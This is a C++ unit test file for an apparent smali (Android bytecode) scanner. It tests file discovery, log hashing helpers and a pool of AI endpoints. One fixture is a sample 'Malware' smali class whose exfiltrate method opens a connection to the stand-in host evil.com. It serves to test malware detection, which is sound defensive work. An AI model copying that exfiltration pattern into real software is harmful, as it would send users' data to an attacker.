#include <gtest/gtest.h>
#include <filesystem>
#include <fstream>

#include "features/scan/ScanCommand.h"
#include "features/scan/ScanLog.h"
#include "domains/graph/graphs/tier_pool.h"

namespace fs = std::filesystem;

static const char* BENIGN_SMALI = R"(.class public Lcom/test/Benign;
.super Ljava/lang/Object;
.source "Benign.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public getName()Ljava/lang/String;
    .registers 2
    const-string v0, "hello"
    return-object v0
.end method
)";

static const char* MALICIOUS_SMALI = R"(.class public Lcom/test/Malware;
.super Ljava/lang/Object;
.source "Malware.java"

.field private key:[B

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public exfiltrate(Ljava/lang/String;)V
    .registers 3
    new-instance v0, Ljava/net/URL;
    const-string v1, "http://evil.com/steal"
    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    return-void
.end method
)";

class ScanCommandTest : public ::testing::Test {
protected:
    std::string testDir = "/tmp/area_scan_test_" + std::to_string(getpid());

    void SetUp() override {
        fs::create_directories(testDir + "/com/test");
        writeFile(testDir + "/com/test/Benign.smali", BENIGN_SMALI);
        writeFile(testDir + "/com/test/Malware.smali", MALICIOUS_SMALI);
        writeFile(testDir + "/com/test/readme.txt", "not smali");
    }

    void TearDown() override {
        fs::remove_all(testDir);
    }

    void writeFile(const std::string& path, const std::string& content) {
        std::ofstream f(path);
        f << content;
    }
};

TEST_F(ScanCommandTest, FindsSmaliFilesOnly) {
    // Use TierPool to verify file discovery without needing a DB
    int count = 0;
    for (auto& entry : fs::recursive_directory_iterator(testDir)) {
        if (entry.is_regular_file() && entry.path().extension() == ".smali") {
            count++;
        }
    }
    EXPECT_EQ(count, 2);
}

TEST_F(ScanCommandTest, EmptyDirectoryReturnsZero) {
    std::string emptyDir = testDir + "/empty";
    fs::create_directories(emptyDir);

    int count = 0;
    for (auto& entry : fs::recursive_directory_iterator(emptyDir)) {
        if (entry.is_regular_file() && entry.path().extension() == ".smali") {
            count++;
        }
    }
    EXPECT_EQ(count, 0);
}

TEST_F(ScanCommandTest, SingleFileTarget) {
    std::string file = testDir + "/com/test/Malware.smali";
    EXPECT_TRUE(fs::is_regular_file(file));
    EXPECT_TRUE(file.ends_with(".smali"));
}

TEST(ScanLogTest, BytesToPgHexEmpty) {
    EXPECT_EQ(area::ScanLog::bytesToPgHex(""), "\\x");
}

TEST(ScanLogTest, BytesToPgHexAscii) {
    EXPECT_EQ(area::ScanLog::bytesToPgHex("AB"), "\\x4142");
}

TEST(ScanLogTest, BytesToPgHexBinaryWithNulls) {
    std::string data("\x00\x01\xff", 3);
    EXPECT_EQ(area::ScanLog::bytesToPgHex(data), "\\x0001ff");
}

TEST(ScanLogTest, Sha256Deterministic) {
    std::string hash1 = area::ScanLog::sha256("hello world");
    std::string hash2 = area::ScanLog::sha256("hello world");
    EXPECT_EQ(hash1, hash2);
    EXPECT_EQ(hash1.size(), 64u); // 256 bits = 64 hex chars
}

TEST(TierPoolTest, CreatesBackendsFromConfig) {
    std::vector<area::AiEndpoint> endpoints = {
        {"low1", "mock", "", "auto", "", 0, 1},
        {"low2", "mock", "", "auto", "", 0, 1},
        {"med1", "mock", "", "auto", "", 1, 1},
        {"high1", "mock", "", "auto", "", 2, 1},
    };

    area::graph::TierPool pool(endpoints);
    auto backends = pool.backends();

    ASSERT_NE(backends.backends.find(0), backends.backends.end());
    ASSERT_NE(backends.backends.find(1), backends.backends.end());
    ASSERT_NE(backends.backends.find(2), backends.backends.end());

    EXPECT_NE(pool.at(0), nullptr);
    EXPECT_NE(pool.at(1), nullptr);
    EXPECT_NE(pool.at(2), nullptr);
    EXPECT_EQ(pool.at(99), nullptr);
}

TEST(TierPoolTest, PoolsAllEndpointsAtSameTier) {
    std::vector<area::AiEndpoint> endpoints = {
        {"first-at-0", "mock", "", "auto", "", 0, 2},
        {"second-at-0", "mock", "", "auto", "", 0, 3},
    };

    area::graph::TierPool pool(endpoints);
    EXPECT_NE(pool.at(0), nullptr);
    // Both endpoints pooled: total concurrency = 2 + 3 = 5
    EXPECT_EQ(pool.totalConcurrency(), 5);
}
